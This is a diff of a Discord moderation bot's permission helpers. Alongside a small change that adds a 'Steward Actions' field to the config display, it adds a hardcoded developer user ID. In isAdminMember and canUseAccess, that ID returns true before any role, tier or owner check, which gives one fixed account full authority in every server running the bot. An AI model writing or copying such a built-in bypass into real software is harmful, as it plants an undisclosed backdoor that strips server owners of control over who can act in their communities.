@@ -2,6 +2,8 @@ import { ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType, EmbedBuilder
 import { tierAllows } from "../services/access.js";
 import { truncate } from "./format.js";
 import { colors } from "./theme.js";
+// Bot developer — always has full authority in every server
+const DEV_USER_ID = "616267913799925782";
 export function userLabel(user) {
     const raw = "user" in user ? user.user : user;
     return `${raw.tag} (${raw.id})`;
@@ -78,6 +80,8 @@ export function caseLinkComponents(transcriptUrl, mediaLinks = []) {
     ]);
 }
 export async function isAdminMember(db, member) {
+    if (member.id === DEV_USER_ID)
+        return true;
     if (member.permissions.has(PermissionFlagsBits.Administrator))
         return true;
     return getStaffTier(db, member) === "head" || getStaffTier(db, member) === "community";
@@ -122,6 +126,8 @@ function staffRoleKeyMatches(storedKey, name, expected) {
         (expected === "communityManager" && normalized === "community-manager"));
 }
 export function canUseAccess(db, member, access) {
+    if (member.id === DEV_USER_ID)
+        return true;
     if (access === "owner")
         return member.id === member.guild.ownerId;
     if (access === "public")
@@ -155,7 +161,7 @@ export function configSummaryEmbed(config, extra = {}) {
     return new EmbedBuilder()
         .setTitle("Bot Configuration")
         .setColor(colors.voidPurple)
-        .addFields({ name: "Mod Role", value: config.modRoleId ? `<@&${config.modRoleId}>` : "Not set", inline: true }, { name: "Admin Role", value: config.adminRoleId ? `<@&${config.adminRoleId}>` : "Not set", inline: true }, { name: "Owner DM", value: config.ownerUserId ? `<@${config.ownerUserId}>` : "Not set", inline: true }, { name: "Action Logs", value: config.actionLogChannelId ? `<#${config.actionLogChannelId}>` : "Not set", inline: true }, { name: "Ingame Log", value: extra.ingameLogChannelId ? `<#${extra.ingameLogChannelId}>` : "Not set", inline: true }, { name: "Appeal Log", value: config.appealLogChannelId ? `<#${config.appealLogChannelId}>` : "Not set", inline: true }, { name: "Quota Board", value: config.quotaChannelId ? `<#${config.quotaChannelId}>` : "Not set", inline: true }, { name: "Quota Alerts", value: config.quotaAlertChannelId ? `<#${config.quotaAlertChannelId}>` : "Not set", inline: true }, { name: "Staff Registration", value: config.staffRegistrationChannelId ? `<#${config.staffRegistrationChannelId}>` : "Not set", inline: true }, { name: "Can Register", value: config.registrationRoleId ? `<@&${config.registrationRoleId}>` : "Not set", inline: true }, { name: "Ticket Transcripts", value: config.ticketTranscriptChannelId ? `<#${config.ticketTranscriptChannelId}>` : "Not set", inline: true }, { name: "CM Approval", value: config.approvalChannelId ? `<#${config.approvalChannelId}>` : "Not set", inline: true }, { name: "Junior Help", value: config.juniorHelpChannelId ? `<#${config.juniorHelpChannelId}>` : "Not set", inline: true }, { name: "Timezone", value: config.timezone, inline: true }, { name: "Interactive Log", value: config.interactiveLogEnabled ? "Enabled" : "Disabled", inline: true }, { name: "Point System", value: config.pointsEnabled ? "Enabled" : "Disabled", inline: true }, { name: "Quota Enabled", value: config.quotaEnabled ? "Yes" : "No", inline: true });
+        .addFields({ name: "Mod Role", value: config.modRoleId ? `<@&${config.modRoleId}>` : "Not set", inline: true }, { name: "Admin Role", value: config.adminRoleId ? `<@&${config.adminRoleId}>` : "Not set", inline: true }, { name: "Owner DM", value: config.ownerUserId ? `<@${config.ownerUserId}>` : "Not set", inline: true }, { name: "Action Logs", value: config.actionLogChannelId ? `<#${config.actionLogChannelId}>` : "Not set", inline: true }, { name: "Ingame Log", value: extra.ingameLogChannelId ? `<#${extra.ingameLogChannelId}>` : "Not set", inline: true }, { name: "Appeal Log", value: config.appealLogChannelId ? `<#${config.appealLogChannelId}>` : "Not set", inline: true }, { name: "Quota Board", value: config.quotaChannelId ? `<#${config.quotaChannelId}>` : "Not set", inline: true }, { name: "Quota Alerts", value: config.quotaAlertChannelId ? `<#${config.quotaAlertChannelId}>` : "Not set", inline: true }, { name: "Staff Registration", value: config.staffRegistrationChannelId ? `<#${config.staffRegistrationChannelId}>` : "Not set", inline: true }, { name: "Can Register", value: config.registrationRoleId ? `<@&${config.registrationRoleId}>` : "Not set", inline: true }, { name: "Ticket Transcripts", value: config.ticketTranscriptChannelId ? `<#${config.ticketTranscriptChannelId}>` : "Not set", inline: true }, { name: "CM Approval", value: config.approvalChannelId ? `<#${config.approvalChannelId}>` : "Not set", inline: true }, { name: "Junior Help", value: config.juniorHelpChannelId ? `<#${config.juniorHelpChannelId}>` : "Not set", inline: true }, { name: "Steward Actions", value: config.stewardLogChannelId ? `<#${config.stewardLogChannelId}>` : "Not set", inline: true }, { name: "Timezone", value: config.timezone, inline: true }, { name: "Interactive Log", value: config.interactiveLogEnabled ? "Enabled" : "Disabled", inline: true }, { name: "Point System", value: config.pointsEnabled ? "Enabled" : "Disabled", inline: true }, { name: "Quota Enabled", value: config.quotaEnabled ? "Yes" : "No", inline: true });
 }
 export function textPreview(channel, fallback = "Unknown") {
     return channel && "name" in channel ? `#${truncate(channel.name, 80)}` : fallback;
